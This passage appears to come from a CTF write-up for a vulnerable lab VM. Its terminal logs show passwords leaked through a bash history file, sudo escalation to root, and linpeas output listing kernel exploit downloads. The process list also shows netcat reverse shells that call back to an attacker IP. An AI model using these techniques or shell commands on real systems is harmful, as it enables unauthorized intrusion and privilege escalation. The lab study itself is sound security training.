-rw-r--r--  1 JKanode JKanode 3771 Sep  1  2015 .bashrc
drwx------  2 JKanode JKanode 4096 Jul  5 19:24 .cache
-rw-r--r--  1 JKanode JKanode  675 Sep  1  2015 .profile
SHayslett@red:/home/JKanode$ cat .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit
sodu -l
sudo -l
exit

SHayslett@red:/home/JKanode$ ssh JKanode@localhost
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
JKanode@localhost's password:
Welcome back!


JKanode@red:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for JKanode:
Sorry, user JKanode may not run sudo on red.
JKanode@red:~$ exit
logout
Connection to localhost closed.
SHayslett@red:/home/JKanode$ ssh peter@localhost
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@localhost's password:
Welcome back!


red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter:
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
red% sudo -l
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
red% sudo su -
➜  ~ id
uid=0(root) gid=0(root) groups=0(root)
➜  ~ ls -al
total 208
drwx------  4 root root  4096 Jul  5 19:42 .
drwxr-xr-x 22 root root  4096 Jun  7  2016 ..
-rw-------  1 root root     1 Jun  5  2016 .bash_history
-rw-r--r--  1 root root  3106 Oct 22  2015 .bashrc
-rwxr-xr-x  1 root root  1090 Jun  5  2016 fix-wordpress.sh
-rw-r--r--  1 root root   463 Jun  5  2016 flag.txt
-rw-r--r--  1 root root   345 Jun  5  2016 issue
-rw-r--r--  1 root root    50 Jun  3  2016 .my.cnf
-rw-------  1 root root     1 Jun  5  2016 .mysql_history
drwxr-xr-x 11 root root  4096 Jun  3  2016 .oh-my-zsh
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root   103 Jun  5  2016 python.sh
-rw-------  1 root root  1024 Jun  5  2016 .rnd
drwxr-xr-x  2 root root  4096 Jun  4  2016 .vim
-rw-------  1 root root     1 Jun  5  2016 .viminfo
-rw-r--r--  1 root root 54405 Jun  5  2016 wordpress.sql
-rw-r--r--  1 root root 39227 Jul  5 19:27 .zcompdump
-rw-r--r--  1 root root 39373 Jul  5 19:27 .zcompdump-red-5.1.1
-rw-------  1 root root    39 Jun  5  2016 .zsh_history
-rw-r--r--  1 root root  2839 Jun  3  2016 .zshrc
-rw-r--r--  1 root root    17 Jun  3  2016 .zsh-update
➜  ~ cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

➜  ~


```
## 2. 内核提权
```shell
SHayslett@red:/tmp$ ./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |
    |---------------------------------------------------------------------------|
    |         Get latest LinPEAS  :     https://github.com/sponsors/carlospolop |
    |         Follow on Twitter   :     @carlospolopm                           |
    |         Respect on HTB      :     SirBroccoli                             |
    |---------------------------------------------------------------------------|
    |                                 Thank you!                                |
    \---------------------------------------------------------------------------/
          linpeas-ng by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 LEGEND:
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════
                                         ╚═══════════════════╝
OS: Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
User & Groups: uid=1005(SHayslett) gid=1005(SHayslett) groups=1005(SHayslett)
Hostname: red.initech
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)


Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE

                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════
                                        ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04 LTS
Release:	16.04
Codename:	xenial

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16

╔══════════╣ CVEs Check
Vulnerable to CVE-2021-4034

./linpeas.sh: 1197: ./linpeas.sh: [[: not found
./linpeas.sh: 1197: ./linpeas.sh: rpm: not found
./linpeas.sh: 1197: ./linpeas.sh: 0: not found
./linpeas.sh: 1207: ./linpeas.sh: [[: not found


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

╔══════════╣ Date & uptime
Tue  5 Jul 19:56:00 BST 2022
 19:56:00 up  1:23,  1 user,  load average: 0.16, 0.05, 0.06

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk
sda
sda1
sda2
sda5

╔══════════╣ Unmounted file-system?
╚ Check if you can mount unmounted devices
UUID=9bdd8a90-41cc-484f-8c75-0249b9103a31 /               ext4    errors=remount-ro 0       1
UUID=9584ec4a-8708-4802-96e6-9e3067074554 none            swap    sw              0       0

╔══════════╣ Environment
╚ Any private information inside environment variables?
LESSOPEN=| /usr/bin/lesspipe %s
HISTFILESIZE=0
MAIL=/var/mail/SHayslett
SSH_CLIENT=192.168.0.100 35230 22
USER=SHayslett
LANGUAGE=en_GB:en
SHLVL=1
HOME=/home/SHayslett
OLDPWD=/home/JKanode
SSH_TTY=/dev/pts/1
LC_TERMINAL_VERSION=3.4.16
LOGNAME=SHayslett
_=./linpeas.sh
XDG_SESSION_ID=15
TERM=xterm-256color
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
XDG_RUNTIME_DIR=/run/user/1005
LANG=en_GB.UTF-8
HISTSIZE=0
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
LC_TERMINAL=iTerm2
PWD=/tmp
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SSH_CONNECTION=192.168.0.100 35230 192.168.0.150 22
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#dmesg-signature-verification-failed
dmesg Not Found

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04{kernel:4.4.0-21-generic} ]
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: highly probable
   Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-4997] target_offset

   Details: https://www.exploit-db.com/exploits/40049/
   Exposure: highly probable
   Tags: [ ubuntu=16.04{kernel:4.4.0-21-generic} ]
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/40053.zip
   Comments: ip_tables.ko needs to be loaded

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: highly probable
   Tags: [ ubuntu=16.04{kernel:4.4.0-21-generic} ]
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: probable
   Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: probable
   Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL:
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: less probable
   Tags: ubuntu=14.04,fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found
═╣ Execshield enabled? ............ Execshield Not Found
═╣ SELinux enabled? ............... sestatus Not Found
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (oracle)

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════
                                             ╚═══════════╝
╔══════════╣ Container related tools present
/usr/bin/lxc
╔══════════╣ Container details
═╣ Is this a container? ........... No
═╣ Any running containers? ........ No


                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════
                          ╚════════════════════════════════════════════════╝
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
root         1  0.0  0.4   6648  5044 ?        Ss   18:32   0:04 /lib/systemd/systemd --system --deserialize 25
root       491  0.0  0.2   5748  2524 ?        Ss   18:32   0:00 /lib/systemd/systemd-journald
root       514  0.0  0.3  21480  3352 ?        Ss   18:32   0:00 /sbin/lvmetad -f
message+   621  0.0  0.3   6080  3704 ?        Ss   18:32   0:01 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
  └─(Caps) 0x0000000020000000=cap_audit_write
syslog     627  0.0  0.4  30728  4964 ?        Ssl  18:32   0:00 /usr/sbin/rsyslogd -n
root       629  0.0  0.4  96500  4232 ?        Ssl  18:32   0:01 /usr/bin/lxcfs /var/lib/lxcfs/
daemon[0m     631  0.0  0.1   3480  1892 ?        Ss   18:32   0:00 /usr/sbin/atd -f
root       637  0.0  0.1   2244  1108 ?        Ss   18:32   0:00 /usr/sbin/acpid
root       654  0.0  0.2   5576  2524 ?        Ss   18:32   0:00 /usr/sbin/cron -f
root       656  0.0  0.2   4144  2768 ?        Ss   18:32   0:00 /lib/systemd/systemd-logind
root       724  0.0  0.0   3132   108 ?        Ss   18:32   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemon[0mise --scan --syslog
root       969  0.0  0.2   5308  3032 ?        Ss   18:32   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root       999  0.0  0.0   2984   124 ?        Ss   18:32   0:00 /sbin/iscsid
root      1002  0.0  0.2   3444  2812 ?        S<Ls 18:32   0:00 /sbin/iscsid
root      1083  0.0  0.1   2540  1488 ?        S    18:32   0:00 /usr/sbin/inetutils-inetd
root      1240  0.0  0.1   6008  1872 ?        Ss   18:32   0:00 dhclient enp0s3
root      1366  0.0  0.2  34088  2800 ?        Ss   18:32   0:00 /usr/lib/postfix/sbin/master
postfix   1367  0.0  0.2  34116  2764 ?        S    18:32   0:00  _ pickup -l -t unix -u -c
postfix   1368  0.0  0.2  34168  2944 ?        S    18:32   0:00  _ qmgr -l -t unix -u
root      1375  0.0  0.2   5720  2736 ?        S    18:32   0:00 /bin/bash /root/python.sh
root      1389  0.0  0.3   6472  3300 ?        S    18:32   0:00  _ su -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null JKanode
JKanode   1412  0.0  0.0   5436   664 ?        Ss   18:32   0:00      _ bash -c cd /home/JKanode; python2 -m SimpleHTTPServer 8888 &>/dev/null
JKanode   1413  0.0  0.7  14696  7684 ?        S    18:32   0:00          _ python2 -m SimpleHTTPServer 8888
root      1377  0.0  0.2   5720  2860 ?        S    18:32   0:00 /bin/bash /usr/local/src/nc.sh
root      1388  0.0  0.0   2692   656 ?        S    18:32   0:00  _ nc -nlvp 666
root      1379  0.0  0.3   6472  3260 ?        S    18:32   0:00 su -c authbind php -S 0.0.0.0:80 -t /home/www/ &>/dev/null www
www       1410  0.0  0.0   5432   644 ?        Ss   18:32   0:00  _ bash -c authbind php -S 0.0.0.0:80 -t /home/www/ &>/dev/null
www       1411  0.0  2.2 125876 23324 ?        S    18:32   0:00      _ php -S 0.0.0.0:80 -t /home/www/
root      1385  0.0  0.1   4748  1668 tty1     Ss+  18:32   0:00 /sbin/agetty --noclear tty1 linux
www       1395  0.0  0.3   6368  3280 ?        Ss   18:32   0:00 /lib/systemd/systemd --user
www       1398  0.0  0.1   7728  1468 ?        S    18:32   0:00  _ (sd-pam)
JKanode   1403  0.0  0.3   6372  3924 ?        Ss   18:32   0:00 /lib/systemd/systemd --user
JKanode   1406  0.0  0.1   7728  1468 ?        S    18:32   0:00  _ (sd-pam)
root     11406  0.0  0.3  13480  3268 ?        Ss   18:48   0:00 /lib/systemd/systemd-udevd
root     12444  0.0  1.4  42328 15048 ?        Ss   18:48   0:00 /usr/sbin/smbd -D
root     12447  0.0  0.5  40488  5516 ?        S    18:48   0:00  _ /usr/sbin/smbd -D
root     12449  0.0  0.6  42328  6424 ?        S    18:48   0:00  _ /usr/sbin/smbd -D
root     12521  0.0  0.5  26248  5708 ?        Ss   18:48   0:00 /usr/sbin/nmbd -D
mysql    12863  0.0 13.3 537780 136900 ?       Ssl  18:48   0:01 /usr/sbin/mysqld
root     16445  0.0  0.5  10008  5596 ?        Ss   18:48   0:00 /usr/sbin/sshd -D
SHaysle+ 11886  0.0  0.2  10828  3012 ?        S    19:20   0:00      _ sshd: SHayslett@pts/1
SHaysle+ 11887  0.0  0.3   5868  3396 pts/1    Ss   19:20   0:00          _ -bash
SHaysle+ 12466  0.1  0.2   3040  2184 pts/1    S+   19:55   0:00              _ /bin/sh ./linpeas.sh
SHaysle+ 16434  0.0  0.0   3040   832 pts/1    S+   19:56   0:00                  _ /bin/sh ./linpeas.sh
SHaysle+ 16438  0.0  0.3   7916  3304 pts/1    R+   19:56   0:00                  |   _ ps fauxwww
SHaysle+ 16437  0.0  0.0   3040   832 pts/1    S+   19:56   0:00                  _ /bin/sh ./linpeas.sh
dnsmasq  17122  0.0  0.0   9128   324 ?        S    18:48   0:00 /usr/sbin/dnsmasq -x /var/run/dnsmasq/dnsmasq.pid -u dnsmasq -7 /etc/dnsmasq.d,.dpkg-dist,.dpkg-old,.dpkg-new --local-service --trust-anchor=.,19036,8,2,49aac11d7b6f6446702e54a1607371607a1a41855200fd2ce1cdde32f24e8fb5 --trust-anchor=.,20326,8,2,e06d44b80b8f1d39a95c0b0d7c65d08458e880409bbc683457104237c7f8ec8d
  └─(Caps) 0x0000000000003000=cap_net_admin,cap_net_raw
root     27561  0.0  2.6 127368 27036 ?        Ss   18:48   0:00 /usr/sbin/apache2 -k start
www-data  2864  0.0  1.4 127656 14416 ?        S    18:48   0:00  _ /usr/sbin/apache2 -k start
www-data 11735  0.0  0.0   2372   608 ?        S    19:06   0:00  |   _ sh -c uname -a; w; id; /bin/sh -i
www-data 11739  0.0  0.0   2372   628 ?        S    19:06   0:00  |       _ /bin/sh -i
www-data 11747  0.0  0.5   8204  5592 ?        S    19:08   0:00  |           _ python -c import pty; pty.spawn("/bin/bash");
www-data 11748  0.0  0.2   3752  2852 pts/0    Ss+  19:08   0:00  |               _ /bin/bash
www-data  2865  0.0  1.4 127808 14596 ?        S    18:48   0:00  _ /usr/sbin/apache2 -k start
www-data  2866  0.0  1.2 127640 12708 ?        S    18:48   0:00  _ /usr/sbin/apache2 -k start
www-data 11654  0.0  0.0   2372   604 ?        S    18:57   0:00  |   _ sh -c mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe
www-data  2867  0.0  1.5 127856 15368 ?        S    18:48   0:00  _ /usr/sbin/apache2 -k start
www-data  2868  0.0  1.2 127656 12828 ?        S    18:48   0:00  _ /usr/sbin/apache2 -k start
www-data 11665  0.0  0.0   2372   572 ?        S    18:59   0:00  |   _ sh -c mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe;nc 192.168.0.100 443 1>/tmp/backpipe
www-data 11613  0.0  1.3 127664 14032 ?        S    18:50   0:00  _ /usr/sbin/apache2 -k start
www-data 11831  0.0  0.0   2372   568 ?        S    19:12   0:00  |   _ sh -c mknod /tmp/backpipe p;/bin/bash 0</tmp/backpipe | nc 192.168.0.100 443 1>/tmp/backpipe
www-data 11833  0.0  0.2   3644  2692 ?        S    19:12   0:00  |       _ /bin/bash
www-data 11834  0.0  0.1   2768  1604 ?        S    19:12   0:00  |       _ nc 192.168.0.100 443
